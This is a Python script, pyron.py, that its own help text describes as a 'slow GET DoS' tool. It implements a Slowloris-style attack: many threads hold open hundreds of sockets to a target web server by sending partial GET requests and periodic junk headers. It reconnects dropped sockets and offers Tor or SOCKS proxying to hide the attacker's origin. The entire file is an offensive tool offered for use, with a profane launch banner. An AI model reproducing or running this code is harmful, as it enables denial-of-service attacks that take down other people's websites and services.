#!/usr/bin/python3
from socket import *
import time, random, string
import argparse, sys
import threading, socks

s0ckets = []
threadz = []
excepts = []
agents = [
	"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"User-agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.0450$",
	"User-agent: Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"User-agent: Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like $)",
	"User-agent: Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like $)",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9b4) Gecko/2008030317 Firefox/3.0b4",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2",
	"User-agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; de; rv:1.9.0.13) Gecko/2009073021 Firefox/3.0.13",
	"User-agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]
verbose = False


class httpGET(threading.Thread):
	def  __init__(self, url, port, timeout, sockets, socksproxy):
		threading.Thread.__init__(self)
		if tor:
			try:
				global socket, torport
				try:
					torport = tor.split(':')[1]
				except:
					torport = 9050
				torproxy = socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(torport))
				socket = socks.socksocket
			except ValueError:
				exit('Invalid proxy port!!\n\nUsage: pyron.py -u www.host.com\nType pyron.py -h to help with options')
			except IndexError:
				exit('Proxy address invalid!!\n\nUsage: pyron.py -u www.host.com\nType pyron.py -h to help with options')
		if socksproxy:
			global socksport
			try:
				socksport = socksproxy.split(':')[1]
			except Exception as sockserror:
				exit(sockserror, '\ninvalid proxy port')
			socksproxy = socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(socksport))
			socket = socks.socksocket
				
		self.url = url
		self.port = port
		self.socktimeout = socktimeout
		self.thread = thread
		self.sockets = sockets
	def connect(self, name):
		for i in range(int(self.sockets)):
			try:
				s = socket(AF_INET, SOCK_STREAM)	
				s.settimeout(int(self.socktimeout))
				s.connect((self.url, int(self.port)))
				s.send('GET /?{} HTTP/1.1\r\nHost: {}\n{}\nAccept-language: en-US,en,q=0.5\r\nContent-Length: 6000\r\n'.format(random.randint(1, 9999999999999), self.url, user_agent).encode("utf-8"))
			except BrokenPipeError:
				if verbose:
					print('socket broken, restarting...')
					pass
				else:
					pass
			except IOError:
				pass
			if verbose:
				sockets = int(self.sockets)*int(self.thread)
				print('{} opened connections, creating {} sockets'.format(len(list(s0ckets)), sockets))
			else:
				print("Attack started, creating {} sockets".format(self.sockets), end='\r')
			s0ckets.append(s)
			
		if verbose:
			print('{} terminated sockets, keep-alive headers is going to work'.format(self.sockets))
		else:	
			print("{} sockets completed, sending keep-alive's...".format(len(s0ckets)))
			
		LENGTH = len(list(s0ckets))
		try:
			while True:
				for s in list(s0ckets):
					try:	
						s.send('X-a: {}\r\n'.format(random.randint(1, 9999999999999)).encode('utf-8'))
					except BrokenPipeError:
						if verbose:
							pass
						else:
							pass
					except error:
						if verbose: 
							print('socket error, restarting...', end = '\r')
							s0ckets.remove(s)
						else:
							s0ckets.remove(s)
				if verbose:
					print('keep-alives headers working, currently send: {}'.format(len(list(s0ckets))))
				else:
					print('Triggering {} keep-alives headers'.format(int(LENGTH)), end = '\r')				
				for i in range(int(self.sockets) - len(list(s0ckets))):
					if verbose:
						print("restarting {} sockets, currently: {}".format(len(s0ckets), i))
						print("socket {} restarted".format(i))
					else:
						print("Socket {} restarted".format(i))
					try:
						s = get.connect("Thread")
					except error as f:
						if verbose:
							print(f); break
						pass
					s0ckets.append(s)
				time.sleep(retry_timeout)
				if verbose:
					print('re-trying sockets')
		except BrokenPipeError:
			pass
		except IOError:
			pass
		except error as er:
			if verbose == True:
				print('{}'.format(er))
				
		
def main():
	global proxy, proxy_status, user_agent
	global verbose, get, socktimeout
	if tor is True:
		proxy_status = 'TOR'
	elif socksproxy != 0:
		proxy_status = socksproxy
	if socktimeout == None:
		socktimeout = 5
	if user_agent != "":
		user_agent = random.choice(agents)
	get = httpGET(url, port, timeout, sockets, socksproxy)
	print("Let's fuck this server\n\nMethod: GET\nMultithreading enabled\nURL: %s\nSockets: %s\nThreads: %s\nPort: %s\nsocket timeout: %s\nSocks proxy: %s\n"%(url, sockets, thread, port, socktimeout, proxy_status))
	time.sleep(0.9)
	for k in range(int(thread)):
		thr = threading.Thread(target=get.connect, args=(2,))
		threadz.append(thr)
		thr.start()
			

if __name__ == "__main__":
	if len(sys.argv) < 2:
		exit("Usage: pyron.py -u www.host.com\n\nType pyron.py -h to help with options")
	parser = argparse.ArgumentParser(prog="pyron.py", description="slow GET DoS by badb0y17", usage="pyron.py [options] www.example.com")
	parser.add_argument("-u", "--url", help="set the URL")
	parser.add_argument("-p", "--port", default=80, help="HTTP = 80, HTTPS = 443, default is 80")
	parser.add_argument("-s", "--sockets", dest="sockets", default=400, help="number of sockets, by default is 400")
	parser.add_argument("-t", "--threads", dest="threads", default=6, help="enables multithreading, default is 6 threads")
	parser.add_argument('--user-agent', dest="user_agent", help="custom user-agent")
	parser.add_argument("--sock-timeout", dest="socktimeout", help="timeout between sockets")
	parser.add_argument("--retry-timeout", dest="retry_timeout", default=15, help="sockets re-try timeout")
	parser.add_argument("--socksproxy", default = None, dest="socksproxy", help="""Set custom SOCKS proxy
	e.g: --socksproxy 127.0.0.1:9050""")
	parser.add_argument("--tor", help="redirect/tunneling connections through TOR network", default = None, action='store_true')
	parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="verbosity")
	args = parser.parse_args()
	url = args.url
	port = args.port
	sockets = args.sockets
	thread = args.threads
	socksproxy = args.socksproxy
	tor = args.tor
	verbose = args.verbose
	socktimeout = args.socktimeout
	retry_timeout = args.retry_timeout
	user_agent = args.user_agent
	main()
